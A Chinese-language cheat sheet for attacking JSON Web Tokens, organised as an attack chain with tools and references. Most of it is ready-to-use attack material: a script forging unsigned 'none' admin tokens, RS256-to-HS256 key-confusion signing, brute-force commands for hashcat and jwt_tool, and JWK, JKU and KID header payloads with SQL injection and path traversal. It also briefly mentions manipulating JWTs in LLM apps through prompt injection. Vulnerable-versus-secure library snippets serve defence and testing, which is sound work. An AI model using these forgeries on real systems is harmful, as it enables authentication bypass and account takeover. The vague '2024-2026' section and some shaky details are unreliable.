# JWT 攻击

## 原理

JWT (JSON Web Token) 由 Header、Payload、Signature 三部分组成，用于身份认证。常见漏洞包括算法混淆、密钥爆破、None 算法绕过、敏感信息泄露等。

## JWT 结构

```
Header.Payload.Signature

# Header
{"alg": "HS256", "typ": "JWT"}

# Payload
{"sub": "1234567890", "name": "John Doe", "admin": false, "iat": 1516239022}

# Signature
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)
```

## 攻击链

### 1. 信息收集

```bash
# 解码 JWT
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null

# 工具
jwt_tool <token>
jwt-cracker <token>
```

### 2. None 算法绕过

```python
# 将 alg 改为 none
# Header: {"alg": "none", "typ": "JWT"}
# Payload: {"admin": true}
# Signature: 空

# Python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "1234567890", "name": "admin", "admin": True}

def b64(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

token = b64(header) + "." + b64(payload) + "."
print(token)
```

### 3. 算法混淆 (RS256 → HS256)

```python
# 服务端用 RS256（公钥验签）
# 攻击者改为 HS256（用公钥作为密钥签名）
# 如果服务端用公钥验签 HS256，则可伪造

# 1. 获取公钥（通常在 /.well-known/jwks.json 或 /certs）
# 2. 用公钥作为 HMAC 密钥签名

import jwt
public_key = open('public.pem').read()
token = jwt.encode({"admin": True}, public_key, algorithm="HS256")
```

### 4. 弱密钥爆破

```bash
# jwt-cracker
jwt-cracker -t "eyJhbG..." -d "wordlist.txt"

# hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# jwt_tool
python3 jwt_tool.py <token> -C -d wordlist.txt
```

### 5. 密钥泄露

```bash
# 常见泄露点
# /.well-known/jwks.json
# /certs
# /oauth/public_key
# /api/keys
# 源码泄露（.git, .env）
# 配置文件
```

### 6. JWK / JKU / KID 注入

#### JWK 注入

```python
# 在 Header 中嵌入公钥
# Header: {"alg": "RS256", "jwk": {"kty": "RSA", "n": "...", "e": "..."}}
# 用对应私钥签名

# 工具：jwt_tool
python3 jwt_tool.py <token> -X k
```

#### JKU 注入

```python
# Header: {"alg": "RS256", "jku": "https://evil.com/jwks.json"}
# 服务端会从 jku 拉取公钥验签
# 攻击者控制 jwks.json，用自己的私钥签名
```

#### KID 注入

```python
# Header: {"alg": "HS256", "kid": "../../dev/null"}
# 用空字符串作为密钥（/dev/null 内容为空）

# Header: {"alg": "HS256", "kid": "key1' UNION SELECT 'attacker-controlled-secret"}
# SQL 注入 kid

# Header: {"alg": "HS256", "kid": "../../../../../../../../dev/null"}
# 路径穿越
```

### 7. 时间攻击

```python
# 检查 exp, nbf, iat
# 如果 exp 过期，尝试：
# 1. 删除 exp 字段
# 2. 设置 exp 为未来时间
# 3. 设置 iat 为未来时间（某些库会重新计算 exp）
```

### 8. 敏感信息泄露

```python
# JWT Payload 可能包含敏感信息
# 如 password, secret, api_key
# 解码查看
```

### 9. JWT 注入

```python
# 某些应用接受多个 JWT
# 通过 X-Forwarded-For, Cookie 等注入
```

## 各语言 JWT 库漏洞

### Node.js

```javascript
// jsonwebtoken
// 旧版本存在 none 算法绕过
// CVE-2015-9235: 算法混淆

// 漏洞代码
jwt.verify(token, secret)  // 不指定算法
// 安全代码
jwt.verify(token, secret, {algorithms: ['HS256']})
```

### Python

```python
# PyJWT
# 旧版本存在 none 算法绕过
# CVE-2017-11424: 算法混淆

# 漏洞代码
jwt.decode(token, secret, verify=False)  # 不验签
# 安全代码
jwt.decode(token, secret, algorithms=['HS256'])
```

### Java

```java
// java-jwt, jjwt
// 旧版本存在 none 算法绕过

// 漏洞代码
JWT.decode(token)  # 不验签
# 安全代码
JWT.require(algorithm).withIssuer(issuer).build().verify(token)
```

### Go

```go
// dgrijalva/jwt-go
// CVE-2020-26160: 算法混淆

// 漏洞代码
token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    return []byte(secret), nil
})
// 安全代码
token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
    if _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok {
        return nil, fmt.Errorf("unexpected method")
    }
    return []byte(secret), nil
})
```

## 绕过技巧

### 1. 算法混淆

```python
# RS256 → HS256
# 用公钥作为 HMAC 密钥

# 步骤：
# 1. 获取公钥
# 2. 修改 alg 为 HS256
# 3. 用公钥作为密钥签名

# 注意：公钥需要是 PEM 格式
```

### 2. None 算法变体

```python
# "none"
# "None"
# "NONE"
# "nOne"
# 某些库对大小写不敏感
```

### 3. JWK 头注入

```python
# 生成 RSA 密钥对
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 构造 JWK
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "attacker",
    "n": "<base64url of modulus>",
    "e": "AQAB"
  }
}

# 用私钥签名
```

### 4. JKU 路径穿越

```python
# Header: {"jku": "/.well-known/jwks.json"}
# Header: {"jku": "https://target.com/.well-known/jwks.json"}
# 某些应用会信任同域 JKU
```

### 5. KID 路径穿越

```python
# Header: {"kid": "../../../dev/null"}
# 用空字符串作为密钥

# Header: {"kid": "../../../proc/self/environ"}
# 用环境变量作为密钥（如果可控）
```

## 2024-2026 新技术点

### 1. JWT 算法混淆新变种

```python
# PS256 → HS256
# ES256 → HS256
# EdDSA → HS256

# 新算法支持
# PS384, PS512
# ES384, ES512
# EdDSA (Ed25519)
```

### 2. JWE (JSON Web Encryption) 攻击

```python
# JWE 加密的 JWT
# 攻击点：
# - alg: none (加密算法)
# - alg: dir (直接密钥)
# - 算法降级
# - Padding Oracle
```

### 3. JWT 库新漏洞

```python
# jose4j (Java)
# CVE-2023-52428: 算法混淆

# Nimbus JOSE (Java)
# 多个 CVE

# python-jose
# CVE-2024-33664: 算法混淆
```

### 4. OAuth 2.1 新规范

```python
# OAuth 2.1 强制 PKCE
# 但 JWT 实现可能存在缺陷
# DPoP (Demonstrating Proof-of-Possession)
```

### 5. JWT + mTLS

```python
# JWT 与 mTLS 结合
# 通过证书绑定攻击
```

### 6. JWT in WebSocket

```python
# WebSocket 中的 JWT
# 通过 Sec-WebSocket-Protocol 注入
```

### 7. JWT in GraphQL

```python
# GraphQL 中的 JWT
# 通过 mutation 注入
# 通过 introspection 获取信息
```

### 8. JWT in gRPC

```python
# gRPC 中的 JWT
# 通过 metadata 注入
```

### 9. AI 应用 JWT

```python
# LLM 应用中的 JWT
# 通过 prompt injection 操纵
# 通过工具调用泄露
```

### 10. 量子安全 JWT

```python
# 后量子签名算法
# ML-DSA (Dilithium)
# SLH-DSA (SPHINCS+)
# 新的攻击面
```

## 工具推荐

- **jwt_tool** — JWT 综合工具
- **jwt-cracker** — JWT 密钥爆破
- **jwt.io** — 在线解码
- **hashcat** — 密钥爆破
- **Burp JWT Editor** — Burp 插件

## 参考链接

- [PortSwigger JWT](https://portswigger.net/web-security/jwt)
- [PayloadsAllTheThings - JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
- [RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519)
